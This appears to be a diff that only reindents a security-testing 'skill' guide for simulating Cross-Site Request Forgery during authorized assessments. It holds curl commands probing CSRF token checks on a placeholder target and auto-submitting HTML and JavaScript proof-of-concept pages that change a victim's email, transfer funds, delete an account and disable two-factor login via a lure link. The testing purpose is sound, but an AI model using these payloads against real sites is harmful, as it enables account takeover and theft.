@@ -1,8 +1,8 @@
 ---
 name: performing-csrf-attack-simulation
 description: Testing web applications for Cross-Site Request Forgery vulnerabilities
-  by crafting forged requests that exploit authenticated user sessions during authorized
-  security assessments.
+ by crafting forged requests that exploit authenticated user sessions during authorized
+ security assessments.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -88,43 +88,43 @@ Test the strength and enforcement of any CSRF protections present.
 ```bash
 # Check if CSRF token is present
 curl -s -b "session=abc123" \
-  "https://target.example.com/account/settings" | \
-  grep -i "csrf\|token\|_token"
+ "https://target.example.com/account/settings" | \
+ grep -i "csrf\|token\|_token"
 
 # Test 1: Remove the CSRF token entirely
 curl -s -X POST \
-  -b "session=abc123" \
-  -d "email=test@evil.com" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -d "email=test@evil.com" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Test 2: Send empty CSRF token
 curl -s -X POST \
-  -b "session=abc123" \
-  -d "email=test@evil.com&csrf_token=" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -d "email=test@evil.com&csrf_token=" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Test 3: Use a random/invalid CSRF token
 curl -s -X POST \
-  -b "session=abc123" \
-  -d "email=test@evil.com&csrf_token=AAAAAAAAAA" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -d "email=test@evil.com&csrf_token=AAAAAAAAAA" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Test 4: Reuse an expired/old CSRF token
 curl -s -X POST \
-  -b "session=abc123" \
-  -d "email=test@evil.com&csrf_token=previously_captured_token" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -d "email=test@evil.com&csrf_token=previously_captured_token" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Test 5: Use User B's CSRF token with User A's session
 curl -s -X POST \
-  -b "session=user_a_session" \
-  -d "email=test@evil.com&csrf_token=user_b_csrf_token" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=user_a_session" \
+ -d "email=test@evil.com&csrf_token=user_b_csrf_token" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 ```
 
 ### Step 3: Check SameSite Cookie and Header Protections
@@ -143,27 +143,27 @@ curl -s -I "https://target.example.com/login" | grep -i "set-cookie"
 # Check for Origin/Referer header validation
 # Send request with no Referer
 curl -s -X POST \
-  -b "session=abc123" \
-  -H "Referer: " \
-  -d "email=test@evil.com&csrf_token=valid_token" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -H "Referer: " \
+ -d "email=test@evil.com&csrf_token=valid_token" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Send request with evil Referer
 curl -s -X POST \
-  -b "session=abc123" \
-  -H "Referer: https://evil.example.com/attack" \
-  -d "email=test@evil.com&csrf_token=valid_token" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -H "Referer: https://evil.example.com/attack" \
+ -d "email=test@evil.com&csrf_token=valid_token" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 
 # Send request with spoofed Origin
 curl -s -X POST \
-  -b "session=abc123" \
-  -H "Origin: https://evil.example.com" \
-  -d "email=test@evil.com" \
-  "https://target.example.com/api/account/change-email" \
-  -w "%{http_code}"
+ -b "session=abc123" \
+ -H "Origin: https://evil.example.com" \
+ -d "email=test@evil.com" \
+ "https://target.example.com/api/account/change-email" \
+ -w "%{http_code}"
 ```
 
 ### Step 4: Generate CSRF Proof-of-Concept with Burp Suite
@@ -182,16 +182,16 @@ Use Burp's built-in CSRF PoC generator for rapid testing.
 ```html
 <!-- Auto-submitting CSRF PoC for form-encoded POST -->
 <html>
-  <body>
-    <h1>Loading...</h1>
-    <form action="https://target.example.com/api/account/change-email"
-          method="POST" id="csrf-form">
-      <input type="hidden" name="email" value="attacker@evil.com" />
-    </form>
-    <script>
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
+ <body>
+ <h1>Loading...</h1>
+ <form action="https://target.example.com/api/account/change-email"
+ method="POST" id="csrf-form">
+ <input type="hidden" name="email" value="attacker@evil.com" />
+ </form>
+ <script>
+ document.getElementById('csrf-form').submit();
+ </script>
+ </body>
 </html>
 ```
 
@@ -202,19 +202,19 @@ For JSON APIs and other non-standard content types, use advanced techniques.
 ```html
 <!-- CSRF for JSON API using form with enctype -->
 <html>
-  <body>
-    <form action="https://target.example.com/api/account/change-email"
-          method="POST"
-          enctype="text/plain"
-          id="csrf-form">
-      <input type="hidden"
-             name='{"email":"attacker@evil.com","ignore":"'
-             value='"}' />
-    </form>
-    <script>
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
+ <body>
+ <form action="https://target.example.com/api/account/change-email"
+ method="POST"
+ enctype="text/plain"
+ id="csrf-form">
+ <input type="hidden"
+ name='{"email":"attacker@evil.com","ignore":"'
+ value='"}' />
+ </form>
+ <script>
+ document.getElementById('csrf-form').submit();
+ </script>
+ </body>
 </html>
 
 <!-- CSRF via XMLHttpRequest (requires permissive CORS) -->
@@ -229,23 +229,23 @@ xhr.send(JSON.stringify({"email": "attacker@evil.com"}));
 <!-- CSRF via fetch API -->
 <script>
 fetch("https://target.example.com/api/account/change-email", {
-  method: "POST",
-  credentials: "include",
-  headers: {"Content-Type": "application/x-www-form-urlencoded"},
-  body: "email=attacker@evil.com"
+ method: "POST",
+ credentials: "include",
+ headers: {"Content-Type": "application/x-www-form-urlencoded"},
+ body: "email=attacker@evil.com"
 });
 </script>
 
 <!-- CSRF via image tag (GET-based state change) -->
 <img src="https://target.example.com/api/account/delete?confirm=true"
-     style="display:none" />
+ style="display:none" />
 
 <!-- Multi-step CSRF with iframe -->
 <iframe style="display:none" name="csrf-frame"></iframe>
 <form action="https://target.example.com/api/transfer"
-      method="POST" target="csrf-frame" id="csrf-form">
-  <input type="hidden" name="to_account" value="attacker-account" />
-  <input type="hidden" name="amount" value="1000" />
+ method="POST" target="csrf-frame" id="csrf-form">
+ <input type="hidden" name="to_account" value="attacker-account" />
+ <input type="hidden" name="amount" value="1000" />
 </form>
 <script>document.getElementById('csrf-form').submit();</script>
 ```
@@ -261,9 +261,9 @@ python3 -m http.server 8888
 
 # PoC file structure:
 # /tmp/csrf-poc/
-#   index.html          <- CSRF PoC page
-#   change-email.html   <- Email change CSRF
-#   transfer.html       <- Fund transfer CSRF
+# index.html <- CSRF PoC page
+# change-email.html <- Email change CSRF
+# transfer.html <- Fund transfer CSRF
 
 # Testing steps:
 # 1. Log in to target as victim user in Browser A
@@ -278,14 +278,14 @@ python3 -m http.server 8888
 ```html
 <!-- SameSite=Lax bypass using top-level navigation -->
 <html>
-  <body>
-    <a href="https://target.example.com/api/settings?action=disable_2fa"
-       id="csrf-link">Click here for a prize!</a>
-    <script>
-      // Automatic click via social engineering context
-      // SameSite=Lax allows cookies on top-level GET navigations
-    </script>
-  </body>
+ <body>
+ <a href="https://target.example.com/api/settings?action=disable_2fa"
+ id="csrf-link">Click here for a prize!</a>
+ <script>
+ // Automatic click via social engineering context
+ // SameSite=Lax allows cookies on top-level GET navigations
+ </script>
+ </body>
 </html>
 ```
 
